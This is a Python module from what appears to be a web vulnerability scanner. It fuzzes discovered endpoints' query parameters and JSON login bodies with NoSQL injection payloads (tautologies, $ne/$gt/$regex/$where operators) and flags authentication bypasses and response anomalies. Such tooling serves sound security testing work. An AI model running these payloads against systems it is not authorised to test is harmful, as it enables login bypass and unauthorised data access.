
import logging
from typing import Any, Dict, List, Optional
import requests
import json
import urllib.parse
from websecure.core.payloads import load_external_payloads

# Smart context analysis
try:
    from websecure.core.input_analyzer import (
        analyze_input_context, 
        should_skip_payload_category,
        format_analysis_log
    )
    _HAS_ANALYZER = True
except ImportError:
    _HAS_ANALYZER = False

logger = logging.getLogger(__name__)

# Basic NoSQL Payloads
URL_PAYLOADS = [
    ("' && this.password.match(/.*/)//+%00", "regex_bypass"),
    ("'%20%7c%7c%20'a'%3d'a", "tautology"),
    ("';return 'a'=='a' && ''=='", "tautology_js"),
    ("%24where%3D%221%3D1%22", "where_clause"),
    ("1', $or: [ {}, { 'a':'a", "or_injection")
]

NOSQL_PAYLOADS = [
    ({"$ne": "-1"}, "neeq_bypass"),
    ({"$gt": ""}, "gt_bypass"),
    ({"$regex": ".*"}, "regex_bypass"),
    ({"$where": "1==1"}, "where_bypass"),
    ({"$exists": True}, "exists_bypass")
]

# Load external payloads
try:
    _ext = load_external_payloads("nosqli")
    if _ext:
        # Convert string payloads to dummy tuples for URL_PAYLOADS compatibility
        for p in _ext:
            if isinstance(p, str):
                URL_PAYLOADS.append((p, "external_wordlist"))
                # Also try as JSON payload if it looks like JSON
                if p.strip().startswith("{") and p.strip().endswith("}"):
                    try:
                        NOSQL_PAYLOADS.append((json.loads(p), "external_json"))
                    except:
                        pass
except ImportError:
    pass

def run_nosqli_scan(ctx):
    """
    Main entry point for NoSQLi scanner.
    Iterates over discovered endpoints and fuzzes them.
    """
    session = ctx.session
    results = getattr(ctx, "results", {})
    discovery = results.get("discovery", {})
    
    # 1. Collect targets
    # Combine explicitly crawled endpoints and discovered parameter sources
    endpoints = set(results.get("endpoints", []))
    
    # Also add URLs from discovery 'query' list if they are full URLs
    if isinstance(discovery, dict):
        for u in discovery.get("query", []):
            if isinstance(u, str) and "://" in u:
                endpoints.add(u)
                
    # Filter for interesting ones (params or json)
    targets = list(endpoints)
    print(f"[NoSQLi] Scanning {len(targets)} endpoints...")
    
    findings = []
    
    for url in targets:
        if not isinstance(url, str): continue
        if ctx.debug:
            print(f"[NoSQLi] Testing {url}")
            
        # 1. GET Fuzzing
        if "?" in url:
             parsed = urllib.parse.urlparse(url)
             qs = urllib.parse.parse_qs(parsed.query)
             if qs:
                 _fuzz_query_params(url, qs, session, findings)

        # 2. JSON Body Fuzzing (Blind attempt on endpoints that look like APIs)
        # Heuristic: if url ends in /login, /auth, /api, or similar
        lower = url.lower()
        if any(x in lower for x in ["api", "auth", "login", "signin", "user", "v1"]):
            _fuzz_json_body(url, session, findings)

    # Allow custom add_result if available in context or global
    if hasattr(ctx, "add_result") and callable(ctx.add_result):
        for f in findings:
            ctx.add_result("nosqli", f)
    elif "nosqli" in results:
        results["nosqli"].extend(findings)
    else:
        results["nosqli"] = findings

def _fuzz_query_params(url: str, qs: dict, session, results: list):
    """
    Fuzzes GET parameters with NoSQL logic operators.
    """
    base_url = url.split("?")[0]
    
    try:
        base_resp = session.get(url, timeout=5)
    except requests.RequestException:
        return

    for payload_str, pay_type in URL_PAYLOADS:
        for param in qs:
            # Smart context check
            if _HAS_ANALYZER:
                ctx = analyze_input_context(name=param, source="param", url_path=base_url)
                if should_skip_payload_category(ctx.context, "nosqli"):
                    continue

            fuzzed_qs = qs.copy()
            # If valid list, take first
            val = fuzzed_qs[param][0] if fuzzed_qs[param] else ""
            fuzzed_qs[param] = val + payload_str
            
            parsed = urllib.parse.urlparse(url)
            new_query = urllib.parse.urlencode(fuzzed_qs, doseq=True)
            target = urllib.parse.urlunparse(parsed._replace(query=new_query))
            
            try:
                resp = session.get(target, timeout=5)
                if _is_suspicious(base_resp, resp):
                    results.append({
                        "type": "nosqli",
                        "severity": "high",
                        "url": target,
                        "param": param,
                        "payload": payload_str,
                        "evidence": "Response difference / Error detected"
                    })
            except:
                pass

def _fuzz_json_body(url: str, session, results: list):
    """
    Fuzzes endpoint assuming it accepts JSON POST.
    """
    # Baseline
    try:
        base_payload = {"user": "user", "password": "password"}
        base_resp = session.post(url, json=base_payload, timeout=5)
        if base_resp.status_code in (404, 405):
            return
    except:
        return

    # Operator Injection
    for payload_obj, pay_type in NOSQL_PAYLOADS:
        default_targets = ["username", "user", "email", "password", "pass", "id"]
        targets = []
        
        for t in default_targets:
            if _HAS_ANALYZER:
                ctx = analyze_input_context(name=t, source="json")
                if not should_skip_payload_category(ctx.context, "nosqli"):
                     targets.append(t)
            else:
                targets.append(t)
        
        for key in targets:
            attack_payload = base_payload.copy()
            attack_payload[key] = payload_obj
            
            try:
                resp = session.post(url, json=attack_payload, timeout=5)
                
                if base_resp.status_code in (401, 403) and resp.status_code == 200:
                    results.append({
                        "type": "nosqli",
                        "severity": "critical",
                        "url": url,
                        "method": "POST",
                        "message": f"NoSQL Authorization Bypass detected via {pay_type}",
                        "payload": json.dumps(payload_obj),
                        "evidence": {
                            "request_body": json.dumps(attack_payload),
                            "response_status": resp.status_code,
                            "response_snippet": resp.text[:500] if resp.text else ""
                        },
                        "details": f"Injected '{json.dumps(payload_obj)}' into '{key}' and got 200 OK."
                    })
                elif _is_suspicious(base_resp, resp):
                     results.append({
                        "type": "nosqli",
                        "severity": "medium",
                        "url": url,
                        "method": "POST",
                        "message": f"Potential NoSQL Injection Behavior ({pay_type})",
                        "payload": json.dumps(payload_obj),
                        "evidence": {
                            "request_body": json.dumps(attack_payload),
                            "response_status": resp.status_code,
                            "response_snippet": resp.text[:500] if resp.text else ""
                        },
                        "details": f"Injected '{json.dumps(payload_obj)}' into '{key}' caused response anomaly."
                    })
            except:
                pass

def _is_suspicious(base_resp, attack_resp) -> bool:
    """
    Checks if the attack response differs interestingly from the base response.
    """
    # 1. Error messages
    errors = ["MongoError", "bad syntax", "unterminated string", "unexpected token"]
    for e in errors:
        if e.lower() in attack_resp.text.lower():
            if e.lower() not in base_resp.text.lower():
                return True

    # 2. Status code change (excluding standard 400/422 invalid input)
    # If base was 200 and attack is 500 -> suspicious
    if base_resp.status_code == 200 and attack_resp.status_code == 500:
        return True

    # 3. Content Length diff > 50% (ignoring error pages somewhat)
    len_base = len(base_resp.content)
    len_attack = len(attack_resp.content)
    
    if len_base > 0:
        ratio = abs(len_base - len_attack) / len_base
        if ratio > 0.5 and attack_resp.status_code == 200:
            return True
            
    return False

# Alias for generic runners
run = run_nosqli_scan
